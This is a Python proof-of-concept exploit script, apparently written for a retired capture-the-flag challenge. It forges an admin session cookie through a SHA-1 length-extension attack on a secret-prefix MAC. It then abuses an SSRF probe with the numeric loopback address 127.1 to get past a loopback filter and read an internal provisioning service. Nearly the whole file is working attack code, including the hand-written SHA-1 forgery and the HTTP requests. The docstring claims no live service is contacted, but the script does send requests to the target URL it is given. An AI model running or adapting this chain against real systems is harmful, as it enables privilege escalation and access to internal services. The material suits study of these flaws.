#!/usr/bin/env python3
"""Ash Relay — Operation Dawn Annex 14 — PoC.

Exploit chain: the session cookie uses a vulnerable SHA-1 secret-prefix MAC
(SHA1(secret || message)). A SHA-1 length-extension attack appends
`&role=admin` to the operator payload and forges a valid signature without
the secret (secret length 16 bytes). The forged session unlocks the SSRF
probe, whose loopback filter blocks dotted loopback forms but not numeric
IPv4 — `http://127.1:9091/order` reaches the internal provisioning service.

Usage:
    python3 ash_relay_annex14.py [base_url] <session_cookie> [--secret-len N]

The session cookie is a credential and must be supplied explicitly (argv or
ASH_SESSION env var); it is not embedded here. The CTF instance is retired;
this PoC documents the exploit path and does not contact any live service.

Cookie format note: the writeup documents `session=<redacted>` whose first
segment decodes to `user=guest&role=operator` and a SHA-1-sized signature.
The segment encoding is not recorded; base64url (then plain base64) decoding
is attempted, and the forgery mirrors it.
"""

import argparse
import base64
import binascii
import os
import struct
import sys

import requests

SHA1_IV = (0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0)


def _lrot(v: int, n: int) -> int:
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF


def sha1_block(h, block: bytes):
    w = list(struct.unpack(">16I", block)) + [0] * 64
    for i in range(16, 80):
        w[i] = _lrot(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1)
    a, b, c, d, e = h
    for i in range(80):
        if i < 20:
            f, k = (b & c) | (~b & 0xFFFFFFFF & d), 0x5A827999
        elif i < 40:
            f, k = b ^ c ^ d, 0x6ED9EBA1
        elif i < 60:
            f, k = (b & c) | (b & d) | (c & d), 0x8F1BBCDC
        else:
            f, k = b ^ c ^ d, 0xCA62C1D6
        temp = (_lrot(a, 5) + f + e + k + w[i]) & 0xFFFFFFFF
        e, d, c, b, a = d, c, _lrot(b, 30), a, temp
    return [(x + y) & 0xFFFFFFFF for x, y in zip(h, (a, b, c, d, e))]


def sha1_glue_padding(message_len: int) -> bytes:
    ml = (message_len * 8) & 0xFFFFFFFFFFFFFFFF
    pad = b"\x80"
    pad += b"\x00" * ((56 - (message_len + 1) % 64) % 64)
    return pad + ml.to_bytes(8, "big")


def sha1_continue(h, prefix_len: int, data: bytes) -> bytes:
    """SHA1(prefix || data) given the state h after `prefix_len` bytes (block-aligned)."""
    total_bits = ((prefix_len + len(data)) * 8) & 0xFFFFFFFFFFFFFFFF
    msg = data + b"\x80"
    msg += b"\x00" * ((56 - (prefix_len + len(msg)) % 64) % 64)
    msg += total_bits.to_bytes(8, "big")
    for off in range(0, len(msg), 64):
        h = sha1_block(h, msg[off:off + 64])
    return b"".join(struct.pack(">I", x) for x in h)


def length_extend(sig: bytes, secret_len: int, msg: bytes, extra: bytes):
    """Forge SHA1(secret || msg || glue || extra) from SHA1(secret || msg)."""
    glue = sha1_glue_padding(secret_len + len(msg))
    h = list(struct.unpack(">5I", sig))
    prefix_len = secret_len + len(msg) + len(glue)
    forged_sig = sha1_continue(h, prefix_len, extra)
    return msg + glue + extra, forged_sig


def b64_decode_any(s: str) -> bytes:
    s2 = s.strip()
    for decoder in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            pad = s2 + "=" * (-len(s2) % 4)
            return decoder(pad)
        except (binascii.Error, ValueError):
            continue
    raise ValueError("payload segment is not valid base64/base64url")


def b64_encode_like(raw: bytes, template: str) -> str:
    if "-" in template or "_" in template:
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    return base64.b64encode(raw).decode()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("base_url", nargs="?", default="http://<instance>")
    parser.add_argument("session", nargs="?", default=os.environ.get("ASH_SESSION"))
    parser.add_argument("--secret-len", type=int, default=16)
    parser.add_argument("--extra", default="&role=admin")
    args = parser.parse_args()
    if not args.session:
        # TODO: supply the captured `session` cookie (argv or ASH_SESSION).
        parser.error("session cookie is required (argv or ASH_SESSION)")

    cookie = args.session
    if "=" in cookie and cookie.startswith("session="):
        cookie = cookie.split("=", 1)[1]
    parts = cookie.split(".")
    if len(parts) < 2:
        # TODO: adjust segment splitting/encoding if the captured cookie layout differs.
        parser.error("expected 'session' cookie shaped as <payload>.<signature>")
    payload_seg, sig_seg = parts[0], parts[-1]
    msg, sig = b64_decode_any(payload_seg), b64_decode_any(sig_seg)
    if len(sig) != 20:
        parser.error(f"signature segment decodes to {len(sig)} bytes, expected 20 (SHA-1)")
    print(f"[*] payload: {msg!r}")

    forged_msg, forged_sig = length_extend(sig, args.secret_len, msg, args.extra.encode())
    forged_cookie = f"{b64_encode_like(forged_msg, payload_seg)}.{b64_encode_like(forged_sig, sig_seg)}"
    print(f"[*] forged payload: {forged_msg!r}")

    session = requests.Session()
    session.cookies.set("session", forged_cookie)
    r = session.get(f"{args.base_url}/relay", timeout=15)
    print(f"[*] GET /relay -> {r.status_code}")

    r = session.get(f"{args.base_url}/relay/probe",
                    params={"target": "http://127.1:9091/order"}, timeout=15)
    print(f"[*] GET /relay/probe?target=http://127.1:9091/order -> {r.status_code}")
    print(r.text)  # expected: internal standing order contents, including the clearance
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
